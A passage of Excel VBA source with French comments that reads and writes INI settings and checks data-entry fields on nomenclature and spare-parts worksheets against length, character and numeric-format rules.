Private Function ReadStringIni(nameSection As String, nameSubject As String, bufferReturn As String, pathFileWithSeparator As String, nameFile As String) As Boolean
    Dim answer  As Long
    
    'Lecture
    bufferReturn = VBA.Space$(1024)
    answer = GetPrivateProfileString(nameSection, nameSubject, " ", bufferReturn, VBA.Len(bufferReturn), pathFileWithSeparator & nameFile)
    
    'Epuration
    bufferReturn = VBA.Trim(bufferReturn)
    While VBA.Asc(VBA.Right(bufferReturn, 1)) = 0 And VBA.Len(bufferReturn) > 1
        bufferReturn = VBA.Left(bufferReturn, VBA.Len(bufferReturn) - 1)
    Wend

    'Controle du texte renvoy|fffd|
    If Not ControlTextFileIni(bufferReturn) Then bufferReturn = vbNullString: Exit Function
    
    'Recup
    ReadStringIni = True
End Function


'Fonction |fffd|crivant une valeur dans le fichier.ini Main
Function WriteStringIniMain(nameSection As String, nameSubject As String, theText As String) As Boolean
    Dim nameFileIniMain     As String
    Dim nameFileIniLangage  As String
    
    If Not Fichier_Ini Then WriteStringIniMain = Write_Parametre(nameSubject, theText): Exit Function

    'Obtention du chemin et du nom du fichier ini principal
    ObtainNameFilesIni nameFileIniMain, nameFileIniLangage

    'Ecriture
    WriteStringIniMain = WriteStringIni(nameSection, nameSubject, theText, FilesCls.PathWorkBook(ThisWorkbook, True), nameFileIniMain)
End Function


'Fonction |fffd|crivant une valeur dans un fichier.ini
Function WriteStringIni(nameSection As String, nameSubject As String, theText As String, pathFileWithSeparator As String, nameFile As String) As Boolean
    Dim answer              As Long

    'Ecriture
    answer = WritePrivateProfileString(nameSection, nameSubject, theText, pathFileWithSeparator & nameFile)

    'A confirmer
    If answer > 0 Then WriteStringIni = True Else MsgCls.ShowMessage "MsgWrite", nameFile, "MsgEchec", vbNullString, vbOKOnly + vbCritical
End Function


'Fonction |fffd|crivant une valeur dans le fichier.ini langage
'Function WriteStringIniLangage(nameSection As String, nameSubject As String, theText As String) As Boolean
'    Dim nameFileIniMain     As String
'    Dim nameFileIniLangage  As String
'
'    'Obtention du chemin et du nom du fichier ini principal
'    ObtainNameFilesIni nameFileIniMain, nameFileIniLangage
'
'    'Ecriture
'    WriteStringIniLangage = WriteStringIni(nameSection, nameSubject, theText, FilesCls.PathWorkBook(ThisWorkbook, True), nameFileIniLangage)
'End Function


'Fonction renvoyant vrai si le texte re|fffd|u a au moins un caract|fffd|re
Private Function ControlTextFileIni(textReturn As String) As Boolean
    Dim valAsc  As Integer
    
    'Obtention
    On Error Resume Next
        valAsc = VBA.Asc(textReturn)
    On Error GoTo 0

    'Si un texte existe
    If valAsc > 0 Then ControlTextFileIni = True
End Function


Private Function Translate(Section As String, Cle As String, Gest_Erreur As Boolean) As String
    Dim Rech As Object
    Dim langue As String
    Dim lLigne As Long, lColonne As Long
    
    Translate = vbNullString
    With ThisWorkbook.Worksheets(shtLangue)
        On Error Resume Next
        langue = ThisWorkbook.Worksheets(ShAffaire).Range("Langue").Value
        Set Rech = .Columns(1).Find(what:="NameIniLangage", LookAt:=xlWhole)
        If Rech Is Nothing Then Exit Function Else lLigne = Rech.row ' "NameIniLangage" non trouv|fffd| dans la colonne 1
        
        Set Rech = .Rows(lLigne).Find(what:=langue, LookAt:=xlWhole)
        If Rech Is Nothing Then lColonne = 2 Else lColonne = Rech.Column
    
        Set Rech = .Columns(1).Find(what:=Cle, LookAt:=xlWhole)
        If Not Rech Is Nothing And SheetCls.Zone_Nommee_Existe(ThisWorkbook.Worksheets(shtLangue), langue) Then
'            If VBA.Trim(.Cells(Rech.row, .Range(langue).Column).Value) = vbnullstring Then Translate = .Cells(Rech.row, .Range("FR").Column).Value Else Translate = .Cells(Rech.row, .Range(langue).Column).Value
            If VBA.Trim(.Cells(Rech.row, lColonne).Value) = vbNullString Then Translate = .Cells(Rech.row, .Range("FR").Column).Value Else Translate = .Cells(Rech.row, lColonne).Value
        Else
            If Gest_Erreur Then MsgBox msgOnglet & "'" & shtLangue & "'" & msgDefStruct & Section & "/" & Cle & ", Langue:" & langue, vbCritical, APP_TITLE: End
        End If
        On Error GoTo 0
    End With
End Function


'Ecriture dans la Feuille de Param|fffd|trage au lieu de Fichiers .INI
Private Function Write_Parametre(Cle As String, Valeur As String) As Boolean
    Dim Rech As Object
    Dim Colonne As Integer
    
    Select Case ThisWorkbook.Worksheets(ShAffaire).Cells(15, 9).Value
        Case "FR"
            Colonne = 2
        Case "GB"
            Colonne = 3
        Case "ES"
            Colonne = 4
        Case "SL"
            Colonne = 5
        Case "RU"
            Colonne = 6
        Case "PT"
            Colonne = 7
        Case "RO"
            Colonne = 8
        Case Else
            ' Par d|fffd|faut, Fran|fffd|ais
            Colonne = 2
    End Select
    Write_Parametre = False
    With ThisWorkbook.Worksheets(shtLangue)
        Set Rech = .Columns(1).Find(what:=Cle, LookAt:=xlWhole)
        If Not Rech Is Nothing Then
            .Unprotect Password:=CryptCls.Decode(PwDev)
            .Cells(Rech.row, Colonne).Value = Valeur
            Write_Parametre = True
            .Protect Password:=CryptCls.Decode(PwDev), UserInterfaceOnly:=True, DrawingObjects:=True
        End If
    End With
End Function
Attribute VB_Name = "K_Controle_saisie"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Controle de la Saisie des Donn|fffd|es du TDI
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 04/09/2008
'[Version       : V1.8 du 16/04/2009
'[---------------------------------------------------------------------------
'[Sujet: Controle de la Saisie des Donn|fffd|es du TDI
'[---------------------------------------------------------------------------


Public Const Assistance = True

Public Compteur_Ano_Dec As Long
Public Compteur_Ano_Mat As Long
Public Compteur_Ano_Doc As Long
Public Compteur_Ano_Pdr As Long
Public Compteur_Ano_Lien As Long

Public Mem_Controle_Format As Integer

'A Faire, Lancer une Analyse apr|fffd|s un Import


Function Mise_En_Forme_Data_Plus()
    With frmCtrlFormat
        .optPiecesRechange.Visible = True
        If Not .optDecoupage.Value And Not .optMateriels.Value And Not .optDocuments.Value And Not .optPiecesRechange.Value Then .optCtrlComplet.Value = True
        Controle_Complet_Saisie
        Analyse_Format_Data
    End With
End Function


'=====================================
'Bouton 6 - Mise En Forme des Donn|fffd|es
'=====================================
Function Mise_En_Forme_Data()
    With frmCtrlFormat
        .optPiecesRechange.Visible = True
        If Not .optDecoupage.Value And Not .optMateriels.Value And Not .optDocuments.Value And Not .optPiecesRechange.Value Then .optCtrlComplet.Value = True
            .Show
            Controle_Complet_Saisie
    End With
End Function


'=====================================
'Bouton 1 - Analyse Nomenclature
'=====================================
Sub Analyse_Nomenclature()
    With frmCtrlFormat
        .optPiecesRechange.Value = False
        .optPiecesRechange.Visible = False
        If Not .optDecoupage.Value And Not .optMateriels.Value And Not .optDocuments.Value And Not .optPiecesRechange.Value Then .optCtrlComplet.Value = True
        .Show
        Controle_Complet_Saisie
    End With
End Sub


'=====================================
'Bouton 3 - Analyse PR
'=====================================
Sub Controle_Pieces_Rechange()
    frmProgression.FlagAbandon = 0
    frmProgression.lblN|fffd|Traitement = 3
    frmProgression.Show
End Sub


Sub Controle_Complet_Saisie()
    frmProgression.FlagAbandon = 0
    frmProgression.lblN|fffd|Traitement = 1
    frmProgression.Show
End Sub


Sub Analyse_Format_Data()
    ' On desactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
    
    If Mem_Controle_Format = 1 Then
        Renumerotation_Numeros_Ordre shDecoupage
        Compteur_Ano_Dec = 0
        If frmProgression.FlagAbandon = 0 Then Controle_Onglet shDecoupage
        ThisWorkbook.Worksheets(shDecoupage).Visible = True
        ThisWorkbook.Worksheets(shDecoupage).Activate
        ThisWorkbook.Worksheets(shDecoupage).Range("A1").Select
    ElseIf Mem_Controle_Format = 2 Then
        Renumerotation_Numeros_Ordre shMateriels
        Compteur_Ano_Mat = 0
        If frmProgression.FlagAbandon = 0 Then Controle_Onglet shMateriels
        ThisWorkbook.Worksheets(shMateriels).Visible = True
        ThisWorkbook.Worksheets(shMateriels).Activate
        ThisWorkbook.Worksheets(shMateriels).Range("A1").Select
    ElseIf Mem_Controle_Format = 3 Then
        Renumerotation_Numeros_Ordre shDocuments
        Compteur_Ano_Doc = 0
        If frmProgression.FlagAbandon = 0 Then Controle_Onglet shDocuments
        ThisWorkbook.Worksheets(shDocuments).Visible = True
        ThisWorkbook.Worksheets(shDocuments).Activate
        ThisWorkbook.Worksheets(shDocuments).Range("A1").Select
    ElseIf Mem_Controle_Format = 4 Then
        If frmProgression.FlagAbandon = 0 Then Analyse_Pieces_Rechange
        ThisWorkbook.Worksheets(shPieces_Rechange).Visible = True
        ThisWorkbook.Worksheets(shPieces_Rechange).Activate
        ThisWorkbook.Worksheets(shPieces_Rechange).Range("A1").Select
    ElseIf Mem_Controle_Format = 5 Then
        If frmProgression.FlagAbandon = 0 Then Analyse_Formats_Et_Liens
        ThisWorkbook.Worksheets(shCde_Nomenclature).Visible = True
        ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    Else
        If frmProgression.FlagAbandon = 0 Then Analyse_Formats_Et_Liens
        If frmProgression.FlagAbandon = 0 Then Analyse_Pieces_Rechange
        ThisWorkbook.Worksheets(shCde_Nomenclature).Visible = True
        ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    End If

    Application.DisplayCommentIndicator = xlCommentIndicatorOnly
    
    If frmProgression.FlagAbandon = 0 Then frmProgression.UpdateProgress 1, IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine"), 0
    ' On sactive tout ce qui doit l'|fffd|tre
    GererConfiguration True
End Sub


Sub Analyse_Pieces_Rechange()
    Dim Nb_Lignes As Long
    
    Application.EnableEvents = False
    ' On d|fffd|active tout ce qui peut l'|fffd|tre
    GererConfiguration False
    Renumerotation_Numeros_Ordre shPieces_Rechange
    Controle_Onglet shPieces_Rechange
    If frmProgression.FlagAbandon = 0 Then
        Worksheets(shCde_Nomenclature).Cells(18, 4).Value = VBA.Date & " - " & VBA.Time
        Nb_Lignes = Lastline(ThisWorkbook.Worksheets(shPieces_Rechange)) - FirstLine(shPieces_Rechange) + 1
        Worksheets(shPieces_Rechange).Cells(4, 16).Value = IniCls.ReadStringIniLangage("MsgFWK", "MsgNbPieces") & " : " & Nb_Lignes & " , " & Compteur_Ano_Pdr & " anomalie(s)"
    Else
        Worksheets(shCde_Nomenclature).Cells(18, 4).Value = vbNullString
        Worksheets(shPieces_Rechange).Cells(4, 16).Value = vbNullString
    End If

    ' On r|fffd|active tout ce qui doit l'|fffd|tre
    GererConfiguration True
    Application.EnableEvents = True
    If frmProgression.FlagAbandon = 0 Then frmProgression.UpdateProgress 1, IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine"), 0
End Sub


Sub Controle_Onglet(Onglet As String)
    Dim LastLigne As Long, Ligne As Long
    Dim wS          As Worksheet
    Dim MsgInfo     As String
    
    Set wS = ThisWorkbook.Worksheets(Onglet)
    With wS
        .Activate
        If .AutoFilterMode Then On Error Resume Next: .ShowAllData: On Error GoTo 0
    End With

    LastLigne = Lastline(ThisWorkbook.Worksheets(Onglet))
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgAnalyseData") & " " & Onglet
    Ligne = FirstLine(Onglet)
    Do
        DoEvents
        If frmProgression.FlagAbandon Then Exit Sub
        Controle_Format_Ligne wS, Ligne
        frmProgression.UpdateProgress Ligne / LastLigne, MsgInfo & vbCrLf & "Ligne : " & Ligne & " / " & LastLigne, frmProgression.FlagAbandon
        Ligne = Ligne + 1
    Loop Until Ligne > LastLigne
        
    If Onglet = shDecoupage Then
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 3).Value = LastLigne - FirstLine(Onglet) + 1
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 4).Value = Compteur_Ano_Dec
        Largeur_Colonnes_Decoupage shDecoupage
    ElseIf Onglet = shMateriels Then
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = LastLigne - FirstLine(Onglet) + 1
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 4).Value = Compteur_Ano_Mat
        Largeur_Colonnes_Mat_doc Onglet
    ElseIf Onglet = shDocuments Then
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 3).Value = LastLigne - FirstLine(Onglet) + 1
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 4).Value = Compteur_Ano_Doc
        Largeur_Colonnes_Mat_doc Onglet
    End If
End Sub


Sub Controle_Format_Ligne(wS As Worksheet, Ligne As Long)
    Dim Champ As Range, Plage As Range
    Dim Col_Erreur As Long 'de la Feuille
    
    With wS
        If .Name = shDecoupage Then
            Set Plage = ThisWorkbook.Worksheets("Structure").Range("DecName")
            Col_Erreur = ThisWorkbook.Sheets(shDecoupage).Range("Dec_Ctrl_Format").Column
        ElseIf .Name = shMateriels Then
            Set Plage = ThisWorkbook.Worksheets("Structure").Range("MatName")
            Col_Erreur = ThisWorkbook.Sheets(shMateriels).Range("Mat_Ctrl_Format").Column
        ElseIf .Name = shDocuments Then
            Set Plage = ThisWorkbook.Worksheets("Structure").Range("DocName")
            Col_Erreur = ThisWorkbook.Sheets(shDocuments).Range("Doc_Ctrl_Format").Column
        ElseIf .Name = shPieces_Rechange Then
            'On ne controle pas les lignes avec un '*' dans la colonne 1, PrNum_SSEN
            If VBA.Trim(.Cells(Ligne, .Range("PrNum_SSEN").Column).Value) = "*" Then Exit Sub
            Set Plage = ThisWorkbook.Worksheets("Structure").Range("PrName")
            Col_Erreur = ThisWorkbook.Sheets(shPieces_Rechange).Range("Pr_Ctrl_Format").Column
        End If
        'Effacer Le Controle de Format pr|fffd|c|fffd|dent
        .Cells(Ligne, Col_Erreur).Value = vbNullString
        If Assistance Then .Rows(Ligne).ClearComments          'Efface les Commentaire d'aide |fffd| la mise au point
    End With
    
    For Each Champ In Plage
        Controle_Format_Cellule wS, Ligne, Champ, Col_Erreur
    Next
End Sub


Function Controle_Format_Cellule(wS As Worksheet, Ligne As Long, Champ As Range, ByVal Col_Erreur As Integer)
    Dim NoColonne As Integer, Taille As Integer
    Dim New_Value As String, Compl_Err As String, Format As String
    Dim Car_Autor As String
    Dim Obligatoire As Boolean, Anomalie As Boolean ' Si une Anomalie de format de la cellule est d|fffd|tect|fffd|e on ne controle pas les autres
    Dim wsTemp As Worksheet
    Dim rCell As Range
    
    Const Col_Espaces = 3
    Const Col_Majuscule = 4
    Const Col_Accents = 5
    Const Col_Caractere = 6
    Const Col_Obligatoire = 7
    Const Col_TailleMax = 8
    Const Col_TailleMin = 9
    Const Col_Autorise = 10
    Const Col_Numerique = 11
    'Const Col_Controle_Minimum = 12
    
    Anomalie = False
    Compl_Err = vbNullString
    Set wsTemp = ThisWorkbook.Sheets(shTemp)
    Set rCell = wsTemp.Cells(1, 1)
    rCell.NumberFormat = "@"
    On Error GoTo Fin_Controle

    With ThisWorkbook.Worksheets("Structure")
        'Gain peu Significatif 30 Secondes sur 6 Minutes
        'If Not CBool(.Cells(Champ.Row, Col_Controle_Minimum).Value) Then GoTo Fin_Controle
        
        NoColonne = wS.Range(Champ.Value).Column
        ' On stocke la cellule dans une cellule temporaire pour pouvoir travailler dessus
        ' On ne la stocke pas dans une variable car les caract|fffd|res type cyrilliques sont perdus
        rCell.Value = wS.Cells(Ligne, NoColonne).Value
        If rCell.Value <> vbNullString Then
            'Supprimer Espaces
            If CBool(.Cells(Champ.row, Col_Espaces).Value) Then rCell.Value = VBA.Trim(rCell.Value)

            'Mettre en Majuscules
            If CBool(.Cells(Champ.row, Col_Majuscule).Value) Then rCell.Value = VBA.UCase(rCell.Value)

            'Supprimer Accents
            If (CBool(.Cells(Champ.row, Col_Accents).Value)) And (Type_Alphabet(rCell) = "Latin") Then rCell.Value = Supprimer_Accents(rCell.Value)

            'Ecriture Valeur Modifi|fffd|e, D|fffd|clenche un Ev|fffd|nement Worksheet_Change
            If rCell.Value <> wS.Cells(Ligne, NoColonne).Value Then wS.Cells(Ligne, NoColonne).Value = rCell.Value
            'Mise_A_Jour_Date_Modification Ws, Ligne 'Non on ne Trace que les Modifications Manuelles

            '*** Les controles suivants ne modifie pas le contenu de la cellule
            If Not Anomalie Then
                'Caract|fffd|res Interdits
                If VBA.UCase(.Cells(Champ.row, Col_Caractere).Value) = "GEDTMI" Then
                    If Not Caracteres_Compatibles_GedTmi(wS.Cells(Ligne, NoColonne).Value) Then Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1", "MsgCarGed", vbNullString: Anomalie = True Else Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1"
                ElseIf VBA.UCase(.Cells(Champ.row, Col_Caractere).Value) = "SACIM" Then
                    If Not Caracteres_Compatibles_Sacim(wS.Cells(Ligne, NoColonne).Value) Then Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1", "MsgCarSacim", vbNullString: Anomalie = True Else Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1" 'P + ID de la Colonne + -1 (caractere interdit)
                ElseIf CBool(.Cells(Champ.row, Col_Caractere).Value) Then
'A Rationaliser avec Caract_GedTmi et Caract_Sacim
                    If BadCharacters(wS.Cells(Ligne, NoColonne).Value) Then Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1", "MsgBadCharacter", vbNullString: Anomalie = True Else Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & "-1"                                                                   'P + ID de la Colonne + -1 (caractere interdit)
                End If
            End If
            '*****
            If Not Anomalie Then
                'Taille Maximum
                Taille = VBA.val(.Cells(Champ.row, Col_TailleMax).Value)
                If Taille <> 0 And VBA.Len(wS.Cells(Ligne, NoColonne).Value) > Taille Then
                    Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value, "MsgTailleMax", VBA.Str(Taille) & " (=" & VBA.Str(Len(wS.Cells(Ligne, NoColonne).Value)) & ")" 'P + ID de la Colonne"
                    Anomalie = True
                Else
                    Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value 'P + ID de la Colonne
                End If
            End If
            
            If Not Anomalie Then
                Car_Autor = Defaut_Caractere_Autorise(Champ.row, Col_Autorise, Col_Numerique, wS.Cells(Ligne, NoColonne).Value)
                If Car_Autor <> vbNullString Then
                    Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value, "MsgSaisieAutorise", Car_Autor 'P + ID de la Colonne
                    Anomalie = True
                Else
                    Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value 'P + ID de la Colonne
                End If
            End If

            If Not Anomalie Then
                Format = Defaut_Champ_Numerique(Champ.row, Col_Autorise, Col_Numerique, wS.Cells(Ligne, NoColonne).Value)
                If Format <> vbNullString Then
                    Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value, "MsgDefNumerique", Format 'P + ID de la Colonne
                    Anomalie = True
                Else
                    Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value 'P + ID de la Colonne
                End If
            End If
        End If

        If Not Anomalie Then
            'Taille Minimum. Cellule vide non autoris|fffd|e si saisie est Obligatoire
            Taille = VBA.val(.Cells(Champ.row, Col_TailleMin).Value)
            Obligatoire = CBool(.Cells(Champ.row, Col_Obligatoire).Value)
            If Obligatoire Then Compl_Err = "-2"

            If Obligatoire And VBA.Len(wS.Cells(Ligne, NoColonne).Value) = 0 Then
                Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & Compl_Err, "MsgObligatoire", vbNullString 'P + ID de la Colonne
                Anomalie = True
            ElseIf Taille <> 0 And VBA.Len(wS.Cells(Ligne, NoColonne).Value) < Taille And VBA.Len(wS.Cells(Ligne, NoColonne).Value) > 0 Then
                Affiche_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & Compl_Err, "MsgTailleMin", VBA.Str(Taille) & " (=" & VBA.Str(Len(wS.Cells(Ligne, NoColonne).Value)) & ")"
                Anomalie = True
            Else
                Supprime_Code_Erreur wS.Cells(Ligne, NoColonne), Col_Erreur, "P" & wS.Cells(1, NoColonne).Value & Compl_Err 'P + ID de la Colonne
            End If
        End If

        If Not Anomalie Then
            Anomalie = Traitement_Cas_Particuliers(wS, Ligne, Champ.Value, NoColonne, Col_Erreur)
        End If
        
        'Champs calcul|fffd|s de l'onglet Pi|fffd|ces de Rechange
        If Champ.Value = "PrPrixUnitaire" Then
            '"PrQuantite", "PrQuantitePropose", "PrPrixUnitaire", "PrPrixPropose", "PrQuantiteRetenue", "PrPrixRetenu"
            wS.Cells(Ligne, wS.Range("PrPrixPropose").Column).Value = CDbl(val(wS.Cells(Ligne, wS.Range("PrPrixUnitaire").Column).Value) * _
                VBA.val(wS.Cells(Ligne, wS.Range("PrQuantitePropose").Column).Value))
            wS.Cells(Ligne, wS.Range("PrPrixRetenu").Column).Value = CDbl(val(wS.Cells(Ligne, wS.Range("PrPrixUnitaire").Column).Value) * _
                VBA.val(wS.Cells(Ligne, wS.Range("PrQuantiteRetenue").Column).Value))
        End If
        
        'Comptage du Nombre d'anomalies de Format
        If Anomalie Then Comptage_Anomalie_Format wS
    End With
    
Fin_Controle:
    On Error GoTo 0
End Function

Function Type_Alphabet(ByVal Cellule As Range) As String
    Dim Alpha As String
    Dim i As Integer
    Alpha = "Latin" ' Valeur par d|fffd|faut
    i = 1
    Do Until i > VBA.Len(Cellule.Value)
        Select Case VBA.AscW(VBA.Mid(Cellule, i, 1))
            Case 0 To 591
                ' Rien a faire
            Case 1024 To 1327
                Alpha = "Cyrillic"
                Exit Do
        End Select
        i = i + 1
    Loop
    Type_Alphabet = Alpha
End Function

Function Defaut_Caractere_Autorise(Ligne As Long, Col_Autorise As Integer, Col_Numerique As Integer, New_Value As String) As String
    Dim Defaut      As Boolean
    Dim Liste_Car   As String
    
    Defaut = False
    Defaut_Caractere_Autorise = vbNullString
    
    With ThisWorkbook.Worksheets("Structure")
        'Liste des Caract|fffd|res autoris|fffd|s et pas un Num|fffd|rique
        Liste_Car = VBA.Trim(.Cells(Ligne, Col_Autorise).Value)
        If Liste_Car <> vbNullString And VBA.UCase(.Cells(Ligne, Col_Numerique).Value) = vbNullString Then If VBA.InStr(Liste_Car, VBA.Chr(34) & New_Value & VBA.Chr(34)) = 0 Then Defaut = True
    End With
    If Defaut Then Defaut_Caractere_Autorise = Liste_Car
End Function

Function Defaut_Champ_Numerique(Ligne As Long, Col_Autorise As Integer, Col_Numerique As Integer, New_Value As String) As String
    Dim Defaut As Boolean
    Dim Format As String
    
    Defaut = False
    Defaut_Champ_Numerique = vbNullString
    With ThisWorkbook.Worksheets("Structure")
        Format = VBA.UCase(.Cells(Ligne, Col_Numerique).Value)
        'Num|fffd|rique Uniquement, Entier ou Decimal
        If Format = "ENTIER" Then
            If (Not VBA.IsNumeric(New_Value) Or VBA.InStr(New_Value, ".") Or VBA.InStr(New_Value, ",")) Then Defaut = True
        ElseIf Format = "DECIMAL" Then
            If Not VBA.IsNumeric(New_Value) Then Defaut = True
        End If
        'ou un Caract|fffd|re de type "-" autorise
        'Liste des Caract|fffd|res autoris|fffd|s
        If Defaut Then If VBA.Trim(.Cells(Ligne, Col_Autorise).Value) <> vbNullString Then If VBA.InStr(.Cells(Ligne, Col_Autorise).Value, VBA.Chr(34) & New_Value & VBA.Chr(34)) <> 0 Then Defaut = False
    End With
    
    If Defaut Then Defaut_Champ_Numerique = Format
End Function

Function Traitement_Cas_Particuliers(wS As Worksheet, Ligne As Long, Nom_Colonne As String, NoColonne As Integer, Col_Erreur As Integer) As Boolean
    Dim Taille_Max As Integer, Taille_Min As Integer
    Dim Caract_Sacim As Boolean, Caract_GedTmi As Boolean, Obligatoire As Boolean, Anomalie As Boolean
    Dim Compl_Err As String
    
    Traitement_Cas_Particuliers = False
    Anomalie = False
    Compl_Err = vbNullString
    Caract_Sacim = False
    Caract_GedTmi = False
    Taille_Max = 0
    Taille_Min = 0
    Obligatoire = False
    
    If Nom_Colonne = "DecNum_SSEN" Then
        Taille_Max = 10
        If wS.Cells(Ligne, wS.Range("DecCategorie").Column).Value = "B" Or wS.Cells(Ligne, wS.Range("DecCategorie").Column).Value = "R" Then Taille_Min = 10
        If wS.Cells(Ligne, wS.Range("DecDocument").Column).Value = "SP" Then Caract_Sacim = True Else Caract_GedTmi = True
    ElseIf Nom_Colonne = "DecSfp" Then
        If wS.Cells(Ligne, wS.Range("DecSfp").Column).Value <> "----" And wS.Cells(Ligne, wS.Range("DecSfp").Column).Value <> vbNullString _
          And wS.Cells(Ligne, wS.Range("DecFp").Column).Value = "----" Then Taille_Max = 32766
    ElseIf Nom_Colonne = "DecOp" Then
        If wS.Cells(Ligne, wS.Range("DecOp").Column).Value <> "----" And wS.Cells(Ligne, wS.Range("DecOp").Column).Value <> vbNullString _
          And wS.Cells(Ligne, wS.Range("DecSfp").Column).Value = "----" Then Taille_Max = 32766
    ElseIf Nom_Colonne = "DecDocument" Then
        ' Si colonne Nomenclature = M alors pas de doc n|fffd|cessaire
        If wS.Cells(Ligne, wS.Range("DecNomencl").Column).Value <> "M" Then
            'documentation obligatoire pour les C et F
            If wS.Cells(Ligne, wS.Range("DecCategorie").Column).Value = "C" Or wS.Cells(Ligne, wS.Range("DecCategorie").Column).Value = "F" Then Taille_Min = 1: Obligatoire = True
        End If
    ElseIf Nom_Colonne = "MatRepere" Then
        'Obligatoire pour les Articles Beds
        If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "A" And (VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "B" Or VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "R") Then Taille_Min = 1: Obligatoire = True
            ElseIf Nom_Colonne = vbNullString Then
    ElseIf Nom_Colonne = "MatNum_SSEN" Then
        'On ne d|fffd|clare pas de P|fffd|re sur un Ensemble d|fffd|clar|fffd| dans l'onglet Mat|fffd|riels
        If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "E" Then Taille_Max = 32767 Else Taille_Min = 1: Obligatoire = True
    ElseIf Nom_Colonne = "MatSuf_SSEN" Then
        'On ne d|fffd|clare pas de P|fffd|re sur un Ensemble d|fffd|clar|fffd| dans l'onglet Mat|fffd|riels
        If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "E" Then Taille_Max = 32767 Else Taille_Min = 1: Obligatoire = False
    ElseIf Nom_Colonne = "MatRefFournisseur" Then
        If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "E" Then
            If wS.Cells(Ligne, wS.Range("MatDocument").Column).Value = "SP" Then Caract_Sacim = True Else Caract_GedTmi = True
            If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "B" Or VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "R" Then Taille_Max = 10: Taille_Min = 10 Else Taille_Max = 10
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "S" Then
            If wS.Cells(Ligne, wS.Range("MatDocument").Column).Value = "SP" Then Caract_Sacim = True Else Caract_GedTmi = True
            If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "B" Or VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "R" Then Taille_Max = 10: Taille_Min = 10 Else Taille_Max = 10
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "A" Then
            If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "B" Or VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "R" Then
                Taille_Max = 10
                Taille_Min = 10
                If wS.Cells(Ligne, wS.Range("MatDocument").Column).Value = "SP" Then Caract_Sacim = True Else Caract_GedTmi = True
            Else
                Taille_Max = 25
                If wS.Cells(Ligne, wS.Range("MatDocument").Column).Value <> vbNullString Then Caract_Sacim = True Else Caract_GedTmi = True
            End If
        End If
    ElseIf Nom_Colonne = "MatDesignation" Then
        If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "E" Then
            Taille_Max = 30
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "S" Then
            Taille_Max = 30
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "A" Then
            Taille_Max = 40
        ElseIf VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = vbNullString Then
            Taille_Max = 40
        End If
    ElseIf Nom_Colonne = "MatDocument" Then
        Taille_Max = 25
        'Vide pour les cat|fffd|gories "B" et "R"
        If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "C" Or VBA.UCase(wS.Cells(Ligne, wS.Range("MatNature").Column).Value) = "F" Then Taille_Min = 1: Obligatoire = True
    ElseIf Nom_Colonne = "MatPieceRechange" Then
        If VBA.UCase(wS.Cells(Ligne, wS.Range("MatNiveau").Column).Value) = "A" Then Taille_Min = 1: Obligatoire = True
